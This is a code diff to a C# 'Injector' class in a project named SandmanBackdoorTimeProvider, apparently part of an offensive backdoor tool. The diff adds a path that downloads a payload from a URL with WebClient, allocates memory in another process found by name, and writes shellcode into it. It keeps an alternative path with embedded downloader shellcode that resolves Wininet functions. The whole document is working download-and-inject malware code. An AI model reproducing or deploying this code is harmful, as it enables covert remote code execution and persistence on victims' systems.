@@ -1,11 +1,18 @@
-﻿using System;
+﻿// #define USE_SHELLCODE --> Uncomment to use orca's shellcode.
+using System;
 using System.Diagnostics;
+
+#if USE_SHELLCODE
 using System.Text;
+#else
+using System.Net;
+#endif
 
 namespace SandmanBackdoorTimeProvider
 {
     internal class Injector
     {
+#if USE_SHELLCODE
         // Thanks Orca :) (https://github.com/ORCx41/D-R-Shellcode/blob/main/Loader.c)
         private static byte[] rawShellcode = new byte[] {
         0x48, 0x83, 0xEC, 0x38,
@@ -94,12 +101,11 @@ namespace SandmanBackdoorTimeProvider
         private const int INTERNETREADFILE_OFFSET = 200;
         private const int INTERNETCLOSEHANDLE_OFFSET1 = 217;
         private const int INTERNETCLOSEHANDLE_OFFSET2 = 234;
+#endif
 
         public static bool InjectShellcode(string payloadUrl, int payloadSize, string targetProcessName)
         {
-            byte[] bPayloadUrl = new byte[payloadUrl.Length + 1];
-            Array.Copy(Encoding.ASCII.GetBytes(payloadUrl), bPayloadUrl, payloadUrl.Length);
-            bPayloadUrl[payloadUrl.Length] = 0x00;
+            byte[] shellcode = new byte[payloadSize];
 
             // Getting handle to the target process.
             Process[] processInstances = Process.GetProcessesByName(targetProcessName);
@@ -108,9 +114,26 @@ namespace SandmanBackdoorTimeProvider
                 return false;
             Process targetProcess = processInstances[0];
 
+#if USE_SHELLCODE
+            byte[] bPayloadUrl = new byte[payloadUrl.Length + 1];
+            Array.Copy(Encoding.ASCII.GetBytes(payloadUrl), bPayloadUrl, payloadUrl.Length);
+            bPayloadUrl[payloadUrl.Length] = 0x00;
+
             // Allocating memory for shellcode and url address.
-            byte[] shellcode = rawShellcode.Clone() as byte[];
+            shellcode = rawShellcode.Clone() as byte[];
             IntPtr address = Win32Helper.VirtualAllocEx(targetProcess.Handle, IntPtr.Zero, (UInt32)(shellcode.Length + bPayloadUrl.Length), Win32Helper.AllocationType.Commit | Win32Helper.AllocationType.Reserve, Win32Helper.MemoryProtection.PAGE_READWRITE);
+#else
+            using (var client = new WebClient())
+            {
+                byte[] temp = client.DownloadData(payloadUrl);
+
+                if (temp == null || temp.Length != payloadSize)
+                    return false;
+
+                shellcode = temp.Clone() as byte[];
+            }
+            IntPtr address = Win32Helper.VirtualAllocEx(targetProcess.Handle, IntPtr.Zero, (UInt32)(shellcode.Length), Win32Helper.AllocationType.Commit | Win32Helper.AllocationType.Reserve, Win32Helper.MemoryProtection.PAGE_READWRITE);
+#endif
 
             if (address.Equals(IntPtr.Zero))
             {
@@ -118,6 +141,7 @@ namespace SandmanBackdoorTimeProvider
                 return false;
             }
 
+#if USE_SHELLCODE
             // Writing the URL and iterating the address.
             if (!Win32Helper.WriteProcessMemory(targetProcess.Handle, address, bPayloadUrl, bPayloadUrl.Length, out IntPtr _))
             {
@@ -130,6 +154,7 @@ namespace SandmanBackdoorTimeProvider
                 return false;
 
             address += bPayloadUrl.Length + 1;
+#endif
 
             // Normal shellcode injection.
             if (!Win32Helper.WriteProcessMemory(targetProcess.Handle, address, shellcode, shellcode.Length, out IntPtr _))
@@ -150,6 +175,7 @@ namespace SandmanBackdoorTimeProvider
             return true;
         }
 
+#if USE_SHELLCODE
         private static bool PatchShellcode(IntPtr payloadUrlAddress, int payloadSize, ref byte[] shellcode)
         {
             byte[] bPayloadUrl = BitConverter.GetBytes(payloadUrlAddress.ToInt64());
@@ -163,7 +189,7 @@ namespace SandmanBackdoorTimeProvider
             // Writing the addresses to the required functions.
             if (Win32Helper.LoadLibraryA("Wininet.dll") == IntPtr.Zero)
                 return false;
-
+            
             byte[] pInternetOpen = BitConverter.GetBytes((UInt64)Win32Helper.GetProcAddress(Win32Helper.GetModuleHandleA("Wininet.dll"), "InternetOpenA").ToInt64());
             byte[] pInternetOpenUrl = BitConverter.GetBytes((UInt64)Win32Helper.GetProcAddress(Win32Helper.GetModuleHandleA("Wininet.dll"), "InternetOpenUrlA").ToInt64());
             byte[] pVirtualAlloc = BitConverter.GetBytes((UInt64)Win32Helper.GetProcAddress(Win32Helper.GetModuleHandleA("Kernel32.dll"), "VirtualAlloc").ToInt64());
@@ -185,5 +211,6 @@ namespace SandmanBackdoorTimeProvider
 
             return true;
         }
+#endif
     }
 }
